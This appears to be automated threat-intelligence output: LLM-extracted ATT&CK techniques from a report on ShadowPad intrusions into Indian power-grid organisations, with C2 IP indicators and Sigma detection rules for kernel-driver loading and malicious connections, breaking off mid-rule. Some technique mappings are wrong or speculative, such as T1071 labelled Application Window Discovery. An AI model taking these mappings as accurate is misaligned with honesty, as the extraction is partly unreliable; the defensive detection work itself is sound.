{
  "status": "success",
  "mode": "langchain",
  "extraction": {
    "status": "success",
    "extraction_summary": {
      "reports_processed": 1,
      "total_ttps_extracted": 29,
      "processing_time_ms": 0
    },
    "extraction_results": [
      {
        "report_id": "pdf-46394f8dca8e850d2bb664d72cd7f6af",
        "extracted_ttps": [
          {
            "ttp_id": "52a67f56-f18b-4d14-a28a-fb6392ba85fb",
            "report_id": "pdf-46394f8dca8e850d2bb664d72cd7f6af",
            "technique_name": "Compromise Infrastructure",
            "attack_id": "T1584",
            "tactic": "Resource Development",
            "description": "The threat actors compromised infrastructure, including DVR/IP camera systems, to conduct malicious activities.",
            "confidence_score": 0.769,
            "confidence_level": "high",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 1.0,
              "description_detail": 0.299,
              "tool_mentions": 1.0,
              "context_richness": 0.76,
              "multiple_sources": 0.5
            },
            "indicators": [
              "14.43.108[.]22",
              "59.10.140[.]47",
              "59.127.10[.]132",
              "61.74.255[.]16",
              "122.116.165[.]62",
              "112.171.218[.]39",
              "114.34.10[.]80",
              "114.35.16[.]182",
              "114.35.191[.]224",
              "119.200.211[.]197",
              "121.128.198[.]233",
              "121.151.212[.]101",
              "122.116.234[.]73",
              "124.216.159[.]70",
              "175.200.146[.]227",
              "175.208.234[.]194",
              "175.214.193[.]170",
              "182.220.237[.]217",
              "210.123.140[.]200",
              "211.184.160[.]108",
              "220.132.106[.]193",
              "220.133.141[.]117"
            ],
            "tools": [
              "net",
              "AT",
              "ping",
              "sc",
              "Reg"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "de6745ae-384a-4de5-8ff6-2f026d595912",
            "report_id": "pdf-46394f8dca8e850d2bb664d72cd7f6af",
            "technique_name": "Application Layer Protocol - Web Protocols",
            "attack_id": "T1071",
            "tactic": "Command and Control",
            "description": "The threat actors used web protocols for command and control communications.",
            "confidence_score": 0.767,
            "confidence_level": "high",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 1.0,
              "description_detail": 0.29,
              "tool_mentions": 1.0,
              "context_richness": 0.76,
              "multiple_sources": 0.5
            },
            "indicators": [
              "14.43.108[.]22",
              "59.10.140[.]47",
              "59.127.10[.]132",
              "61.74.255[.]16",
              "122.116.165[.]62",
              "112.171.218[.]39",
              "114.34.10[.]80",
              "114.35.16[.]182",
              "114.35.191[.]224",
              "119.200.211[.]197",
              "121.128.198[.]233",
              "121.151.212[.]101",
              "122.116.234[.]73",
              "124.216.159[.]70",
              "175.200.146[.]227",
              "175.208.234[.]194",
              "175.214.193[.]170",
              "182.220.237[.]217",
              "210.123.140[.]200",
              "211.184.160[.]108",
              "220.132.106[.]193",
              "220.133.141[.]117"
            ],
            "tools": [
              "net",
              "AT",
              "ping",
              "sc",
              "Reg"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "6706f46f-14eb-4fee-84cf-c745c2a378db",
            "report_id": "pdf-46394f8dca8e850d2bb664d72cd7f6af",
            "technique_name": "Exfiltration Over C2 Channel",
            "attack_id": "T1041",
            "tactic": "Exfiltration",
            "description": "The threat actors exfiltrated data over the command and control channel.",
            "confidence_score": 0.762,
            "confidence_level": "high",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 1.0,
              "description_detail": 0.253,
              "tool_mentions": 1.0,
              "context_richness": 0.76,
              "multiple_sources": 0.5
            },
            "indicators": [
              "14.43.108[.]22",
              "59.10.140[.]47",
              "59.127.10[.]132",
              "61.74.255[.]16",
              "122.116.165[.]62",
              "112.171.218[.]39",
              "114.34.10[.]80",
              "114.35.16[.]182",
              "114.35.191[.]224",
              "119.200.211[.]197",
              "121.128.198[.]233",
              "121.151.212[.]101",
              "122.116.234[.]73",
              "124.216.159[.]70",
              "175.200.146[.]227",
              "175.208.234[.]194",
              "175.214.193[.]170",
              "182.220.237[.]217",
              "210.123.140[.]200",
              "211.184.160[.]108",
              "220.132.106[.]193",
              "220.133.141[.]117"
            ],
            "tools": [
              "net",
              "AT",
              "ping",
              "sc",
              "Reg"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "836b2473-68f5-4b06-826f-2aac779b1154",
            "report_id": "pdf-46394f8dca8e850d2bb664d72cd7f6af",
            "technique_name": "Proxy",
            "attack_id": "T1090",
            "tactic": "Command and Control",
            "description": "The threat activity group used the open source tool FastReverseProxy (FRP) for command and control (C2) of Shadowpad malware infections",
            "confidence_score": 0.752,
            "confidence_level": "high",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.445,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "FastReverseProxy (FRP)"
            ],
            "tools": [
              "net",
              "FastReverseProxy (FRP)",
              "AT",
              "Shadowpad malware",
              "ping",
              "Reg",
              "sc"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "a5c78794-6888-44a9-a461-824e2fa76754",
            "report_id": "pdf-46394f8dca8e850d2bb664d72cd7f6af",
            "technique_name": "Proxy: Multi-hop Proxy",
            "attack_id": "T1090.003",
            "tactic": "Command and Control",
            "description": "The threat actors used multi-hop proxies to communicate with compromised systems.",
            "confidence_score": 0.752,
            "confidence_level": "high",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 1.0,
              "description_detail": 0.253,
              "tool_mentions": 1.0,
              "context_richness": 0.76,
              "multiple_sources": 0.5
            },
            "indicators": [
              "14.43.108[.]22",
              "59.10.140[.]47",
              "59.127.10[.]132",
              "61.74.255[.]16",
              "122.116.165[.]62",
              "112.171.218[.]39",
              "114.34.10[.]80",
              "114.35.16[.]182",
              "114.35.191[.]224",
              "119.200.211[.]197",
              "121.128.198[.]233",
              "121.151.212[.]101",
              "122.116.234[.]73",
              "124.216.159[.]70",
              "175.200.146[.]227",
              "175.208.234[.]194",
              "175.214.193[.]170",
              "182.220.237[.]217",
              "210.123.140[.]200",
              "211.184.160[.]108",
              "220.132.106[.]193",
              "220.133.141[.]117"
            ],
            "tools": [
              "net",
              "AT",
              "ping",
              "sc",
              "Reg"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "59bf4feb-511d-4506-9b56-ac737c0a0cc8",
            "report_id": "pdf-46394f8dca8e850d2bb664d72cd7f6af",
            "technique_name": "Proxy",
            "attack_id": "T1090",
            "tactic": "Command and Control",
            "description": "TAG-38 used the open source tool Fast Reverse Proxy (FRP) for command and control",
            "confidence_score": 0.733,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.322,
              "tool_mentions": 1.0,
              "context_richness": 0.96,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Fast Reverse Proxy (FRP)"
            ],
            "tools": [
              "net",
              "AT",
              "ping",
              "Reg",
              "sc",
              "Fast Reverse Proxy (FRP)"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "b69c6f99-6296-47de-8096-7de89ccb2816",
            "report_id": "pdf-46394f8dca8e850d2bb664d72cd7f6af",
            "technique_name": "Application Window Discovery",
            "attack_id": "T1071",
            "tactic": "Discovery",
            "description": "The threat activity group targeted a national emergency response system and the Indian subsidiary of a multinational logistics company, suggesting they have knowledge of the target's network and applications",
            "confidence_score": 0.708,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.532,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "national emergency response system",
              "multinational logistics company"
            ],
            "tools": [
              "net",
              "AT",
              "ping",
              "sc",
              "Reg"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "378de8f0-c06c-4046-930f-bfa7b6af1a37",
            "report_id": "pdf-46394f8dca8e850d2bb664d72cd7f6af",
            "technique_name": "Remote System Discovery",
            "attack_id": "T1018",
            "tactic": "Discovery",
            "description": "The threat activity group used large-scale automated network traffic analytics to identify potential targets in the Indian power sector",
            "confidence_score": 0.703,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.66,
              "description_detail": 0.422,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Recorded Future Platform",
              "SecurityTrails",
              "PolySwarm",
              "Team Cymru\u2019s Pure Signal"
            ],
            "tools": [
              "net",
              "SecurityTrails",
              "Recorded Future Platform",
              "AT",
              "ping",
              "Reg",
              "sc",
              "Team Cymru\u2019s Pure Signal",
              "PolySwarm"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "e771f0b9-345e-418b-a2df-810b4325dda3",
            "report_id": "pdf-46394f8dca8e850d2bb664d72cd7f6af",
            "technique_name": "Exploit Public-Facing Application",
            "attack_id": "T1190",
            "tactic": "Initial Access",
            "description": "The threat actor compromised 10 distinct Indian power sector organizations, including 4 of the 5 Regional Load Despatch Centres, by likely exploiting public-facing applications.",
            "confidence_score": 0.702,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.492,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Indian power sector organizations",
              "Regional Load Despatch Centres"
            ],
            "tools": [
              "net",
              "AT",
              "ping",
              "sc",
              "Reg"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "d8363d5b-7558-4cb0-846b-5343caa887ec",
            "report_id": "pdf-46394f8dca8e850d2bb664d72cd7f6af",
            "technique_name": "Exploit Public-Facing Application",
            "attack_id": "T1190",
            "tactic": "Initial Access",
            "description": "The threat activity group likely compromised and co-opted internet-facing DVR/IP camera devices for command and control (C2) of Shadowpad malware infections",
            "confidence_score": 0.698,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.468,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "DVR/IP camera devices",
              "Shadowpad malware"
            ],
            "tools": [
              "net",
              "FastReverseProxy (FRP)",
              "AT",
              "Shadowpad malware",
              "ping",
              "Reg",
              "sc"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "6d9a5ca6-c40c-4899-ac53-4f17281924e8",
            "report_id": "pdf-46394f8dca8e850d2bb664d72cd7f6af",
            "technique_name": "Active Scanning",
            "attack_id": "T1595",
            "tactic": "Reconnaissance",
            "description": "Adversaries conducted network intrusions targeting at least 7 Indian State Load Despatch Centres (SLDCs), potentially using active scanning techniques",
            "confidence_score": 0.694,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.437,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "network intrusions",
              "SLDCs"
            ],
            "tools": [
              "net",
              "AT",
              "ping",
              "Reg",
              "Unknown",
              "sc"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "ad0dff22-85c4-46af-abbd-17985d2d1699",
            "report_id": "pdf-46394f8dca8e850d2bb664d72cd7f6af",
            "technique_name": "Exploit Public-Facing Application",
            "attack_id": "T1190",
            "tactic": "Initial Access",
            "description": "The adversary likely compromised internet-facing devices such as IP cameras and DVRs, which were used as C2 servers.",
            "confidence_score": 0.69,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.414,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "IP addresses: 14.43.108[.]22, 210.123.140[.]200, 112.171.218[.]39, 114.35.191[.]224, 59.10.140[.]47, 121.151.212[.]101, 119.200.211[.]197, 124.216.159[.]70, 211.184.160[.]108",
              "Ports: 80, 554, 9090, 8443, 443"
            ],
            "tools": [
              "net",
              "ShadowPad",
              "AT",
              "ping",
              "Reg",
              "sc",
              "Fast Reverse Proxy (FRP)"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "c3e70b60-ca2e-4a9c-943f-a632113cf614",
            "report_id": "pdf-46394f8dca8e850d2bb664d72cd7f6af",
            "technique_name": "User Execution",
            "attack_id": "T1204",
            "tactic": "Execution",
            "description": "TAG-26 used ShadowPad, Poison Ivy, and the RoyalRoad RTF weaponizer to target high-value organizations in India",
            "confidence_score": 0.689,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.62,
              "description_detail": 0.368,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "ShadowPad",
              "Poison Ivy",
              "RoyalRoad RTF"
            ],
            "tools": [
              "net",
              "Poison Ivy",
              "AT",
              "ping",
              "RoyalRoad RTF",
              "Reg",
              "sc",
              "ShadowPad"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "d9b59ad8-3de5-47ba-8a44-7b8169765046",
            "report_id": "pdf-46394f8dca8e850d2bb664d72cd7f6af",
            "technique_name": "Valid Accounts",
            "attack_id": "T1078",
            "tactic": "Initial Access",
            "description": "The threat actor likely used valid accounts to pre-position network access and support Chinese strategic objectives.",
            "confidence_score": 0.683,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.368,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Indian power sector organizations",
              "Regional Load Despatch Centres"
            ],
            "tools": [
              "net",
              "AT",
              "ping",
              "sc",
              "Reg"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "1559bd31-d607-464d-b57d-6b6fed071b8e",
            "report_id": "pdf-46394f8dca8e850d2bb664d72cd7f6af",
            "technique_name": "Use Alternate Authentication Material",
            "attack_id": "T1550",
            "tactic": "Credential Access",
            "description": "China-linked adversaries used the ShadowPad backdoor to target Indian power grid organizations, potentially using alternate authentication material",
            "confidence_score": 0.681,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.391,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "ShadowPad"
            ],
            "tools": [
              "net",
              "AT",
              "ping",
              "Reg",
              "sc",
              "ShadowPad"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "438452ea-58fc-4d9e-86b6-5652331e5ef1",
            "report_id": "pdf-46394f8dca8e850d2bb664d72cd7f6af",
            "technique_name": "Application Window Discovery",
            "attack_id": "T1071",
            "tactic": "Discovery",
            "description": "The adversary used open-source tools like Fast Reverse Proxy (FRP) to expose local services to the internet.",
            "confidence_score": 0.681,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.391,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "FRP server component on port 8443"
            ],
            "tools": [
              "net",
              "AT",
              "ping",
              "Reg",
              "sc",
              "Fast Reverse Proxy (FRP)"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "4f4b98b5-a0a2-44d2-b486-7de6abbc6f71",
            "report_id": "pdf-46394f8dca8e850d2bb664d72cd7f6af",
            "technique_name": "Obfuscated Files or Information",
            "attack_id": "T1027",
            "tactic": "Defense Evasion",
            "description": "The adversary used a shared SSL certificate with a spoofed Microsoft identity to evade detection.",
            "confidence_score": 0.68,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.345,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "SHA1 fingerprint: 0f6afc6e4e383883a6308fcf8d84b14a5bf4ccaf",
              "SSL certificate with spoofed Microsoft identity"
            ],
            "tools": [
              "net",
              "AT",
              "ping",
              "sc",
              "Reg"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "2860623f-3c1e-444d-bb20-488aa259db63",
            "report_id": "pdf-46394f8dca8e850d2bb664d72cd7f6af",
            "technique_name": "Phishing",
            "attack_id": "T1566",
            "tactic": "Initial Access",
            "description": "Although not explicitly mentioned, phishing could be a possible initial access technique used by the threat actor to compromise the Indian power sector organizations.",
            "confidence_score": 0.677,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.492,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "net",
              "AT",
              "ping",
              "sc",
              "Reg"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "d09159ff-2648-40c3-8cfe-86a62cac44e3",
            "report_id": "pdf-46394f8dca8e850d2bb664d72cd7f6af",
            "technique_name": "Phishing",
            "attack_id": "T1566",
            "tactic": "Initial Access",
            "description": "The threat activity group conducted a campaign targeting the Indian power sector, potentially using phishing to gain initial access",
            "confidence_score": 0.667,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.422,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "net",
              "AT",
              "ping",
              "sc",
              "Reg"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "b16f0d83-6be1-4fce-90fa-f34b9f5552e4",
            "report_id": "pdf-46394f8dca8e850d2bb664d72cd7f6af",
            "technique_name": "User Execution",
            "attack_id": "T1204",
            "tactic": "Execution",
            "description": "Adversaries used the ShadowPad backdoor to gain access to Indian power grid organizations",
            "confidence_score": 0.667,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.299,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "ShadowPad"
            ],
            "tools": [
              "net",
              "AT",
              "ping",
              "Reg",
              "sc",
              "ShadowPad"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "afb48ef6-a109-4ef1-9a67-c02cf9d10d19",
            "report_id": "pdf-46394f8dca8e850d2bb664d72cd7f6af",
            "technique_name": "Application Layer Protocol",
            "attack_id": "T1071",
            "tactic": "Command And Control",
            "description": "Detected Application Layer Protocol activity via NLP pattern matching",
            "confidence_score": 0.666,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.199,
              "tool_mentions": 1.0,
              "context_richness": 0.76,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "net",
              "AT",
              "ping",
              "sc",
              "Reg"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "778d2e89-0ab9-458f-b8f2-f07d6f162069",
            "report_id": "pdf-46394f8dca8e850d2bb664d72cd7f6af",
            "technique_name": "Application Window Discovery",
            "attack_id": "T1071",
            "tactic": "Discovery",
            "description": "TAG-38 used compromised infrastructure for command and control of ShadowPad implants",
            "confidence_score": 0.666,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.253,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "ShadowPad",
              "compromised infrastructure"
            ],
            "tools": [
              "net",
              "AT",
              "ping",
              "Reg",
              "sc",
              "ShadowPad"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "4cf43911-1bee-4cf5-8944-f46aac94a451",
            "report_id": "pdf-46394f8dca8e850d2bb664d72cd7f6af",
            "technique_name": "User Execution",
            "attack_id": "T1204",
            "tactic": "Execution",
            "description": "The threat activity group may have used user execution to run malicious commands or scripts on compromised systems",
            "confidence_score": 0.663,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.399,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "net",
              "AT",
              "ping",
              "sc",
              "Reg"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "35ef890d-8abd-4dfd-95ea-fd8a936ecbe0",
            "report_id": "pdf-46394f8dca8e850d2bb664d72cd7f6af",
            "technique_name": "Exfiltration Over Command and Control Channel",
            "attack_id": "T1041",
            "tactic": "Exfiltration",
            "description": "The adversary exfiltrated data from the compromised devices using the C2 channel.",
            "confidence_score": 0.663,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.276,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Network traffic analysis (NTA) exfiltration events"
            ],
            "tools": [
              "net",
              "AT",
              "ping",
              "Reg",
              "sc",
              "ShadowPad"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "1bd9cadc-c99f-4253-8888-b465b9f9644e",
            "report_id": "pdf-46394f8dca8e850d2bb664d72cd7f6af",
            "technique_name": "Exfiltration Over Command and Control Channel",
            "attack_id": "T1041",
            "tactic": "Exfiltration",
            "description": "TAG-38 exfiltrated data from victim networks using ShadowPad implants",
            "confidence_score": 0.659,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.207,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "ShadowPad",
              "exfiltration"
            ],
            "tools": [
              "net",
              "AT",
              "ping",
              "Reg",
              "sc",
              "ShadowPad"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "c23a2b7c-8313-4755-9b40-3f8e714293a7",
            "report_id": "pdf-46394f8dca8e850d2bb664d72cd7f6af",
            "technique_name": "Create or Modify System Process",
            "attack_id": "T1543",
            "tactic": "Persistence",
            "description": "Detected Create or Modify System Process activity via NLP pattern matching",
            "confidence_score": 0.64,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.246,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "net",
              "AT",
              "ping",
              "sc",
              "Reg"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "c054f96c-6b3e-42cd-98e5-9fa0b2b9dcf5",
            "report_id": "pdf-46394f8dca8e850d2bb664d72cd7f6af",
            "technique_name": "Network Service Discovery",
            "attack_id": "T1046",
            "tactic": "Discovery",
            "description": "Detected Network Service Discovery activity via NLP pattern matching",
            "confidence_score": 0.628,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.162,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "net",
              "AT",
              "ping",
              "sc",
              "Reg"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "739f324f-581a-4ba0-861a-22e026e217ab",
            "report_id": "pdf-46394f8dca8e850d2bb664d72cd7f6af",
            "technique_name": "Archive Collected Data",
            "attack_id": "T1560",
            "tactic": "Collection",
            "description": "Detected Archive Collected Data activity via NLP pattern matching",
            "confidence_score": 0.628,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.162,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "net",
              "AT",
              "ping",
              "sc",
              "Reg"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "86c03d2b-f74a-497b-8185-7ae2a00b1407",
            "report_id": "pdf-46394f8dca8e850d2bb664d72cd7f6af",
            "technique_name": "User Execution: Malicious File",
            "attack_id": "T1204.002",
            "tactic": "Execution",
            "description": "Detected User Execution: Malicious File activity via NLP pattern matching",
            "confidence_score": 0.621,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.5,
              "description_detail": 0.185,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "net",
              "AT",
              "ping",
              "sc",
              "Reg"
            ],
            "extraction_method": "nlp_indicator"
          }
        ]
      }
    ]
  },
  "rules": {
    "rules": [
      {
        "title": "Detect Kernel Driver Installation and Malicious C2 Connections from Privileged Accounts",
        "description": "Detects execution of sc.exe with type=kernel flag by privileged accounts, excluding known legitimate driver paths, and detects network connections to known malicious IPs from privileged accounts. Addresses Compromise Infrastructure (Resource Development) technique.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_sc": {
            "Image|endswith": "\\sc.exe",
            "CommandLine|contains": "type=kernel"
          },
          "selection_user_admin": {
            "User|contains": "Administrator",
            "User|endswith": [
              "SYSTEM",
              "LocalService",
              "NetworkService"
            ]
          },
          "selection_allowlist": {
            "Image|startswith": "C:\\Windows\\System32\\drivers\\"
          },
          "selection_net": {
            "DestinationIp|contains": [
              "14.43.108.22",
              "59.10.140.47",
              "59.127.10.132",
              "61.74.255.16",
              "122.116.165.62",
              "112.171.218.39",
              "114.34.10.80",
              "114.35.16.182",
              "114.35.191.224",
              "119.200.211.197",
              "121.128.198.233",
              "121.151.212.101",
              "122.116.234.73",
              "124.216.159.70",
              "175.200.146.227",
              "175.208.234.194",
              "175.214.193.170",
              "182.220.237.217",
              "210.123.140.200",
              "211.184.160.108",
              "220.132.106.193",
              "220.133.141.117"
            ]
          },
          "condition": "(selection_sc and selection_user_admin and not selection_allowlist) or (selection_net and selection_user_admin)"
        },
        "falsepositives": [
          "System administrators installing legitimate kernel drivers from the default drivers directory.",
          "Authorized services (e.g., Windows Update, device management) communicating with vendor IPs that may overlap with the listed addresses."
        ],
        "level": "medium",
        "tags": [
          "attack.resource-development",
          "attack.t1583",
          "custom.driver-installation",
          "custom.c2-communication"
        ],
        "ttp_id": "unknown",
        "technique_name": "Compromise Infrastructure",
        "generation_method": "langchain",
        "id": "170cac91-32eb-4e69-bda6-29a94a08c866",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 93,
          "query_time_ms": 922.0
        }
      },
      {
        "title": "Detect Kernel Driver Loading and Web C2 Communication",
        "description": "Detects use of sc.exe with \"type= kernel\" flag to load drivers, PowerShell or cmd.exe invoking sc.exe for driver loading, registry modifications pointing to kernel drivers, and network connections to known malicious web C2 IPs.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "sc_driver": {
            "Image|endswith": "\\sc.exe",
            "CommandLine|contains": ".sys"
          },
          "ps_sc": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": ".sys"
          },
          "cmd_sc": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": ".sys"
          },
          "registry_driver": {
            "TargetObject|contains": "HKLM\\System\\CurrentControlSet\\Services",
            "Details|contains": ".sys"
          },
          "web_c2": {
            "DestinationIp": [
              "14.43.108.22",
              "59.10.140.47",
              "59.127.10.132",
              "61.74.255.16",
              "122.116.165.62",
              "112.171.218.39",
              "114.34.10.80",
              "114.35.16.182",
              "114.35.191.224",
              "119.200.211.197",
              "121.128.198.233",
              "121.151.212.101",
              "122.116.234.73",
              "124.216.159.70",
              "175.200.146.227",
              "175.208.234.194",
              "175.214.193.170",
              "182.220.237.217",
              "210.123.140.200",
              "211.184.160.108",
              "220.132.106.193",
              "220.133.141.117"
            ]
          },
          "condition": "sc_driver or ps_sc or cmd_sc or registry_driver or web_c2"
        },
        "falsepositives": [
          "Legitimate administrator installing signed kernel drivers using sc.exe",
          "System or third\u2011party software updating drivers via sc.exe",
          "Authorized network traffic to the listed IPs if they belong to corporate infrastructure"
        ],
        "level": "high",
        "tags": [
          "attack.t1071.001",
          "attack.command_and_control"
        ],
        "ttp_id": "unknown",
        "technique_name": "Application Layer Protocol - Web Protocols",
        "generation_method": "langchain",
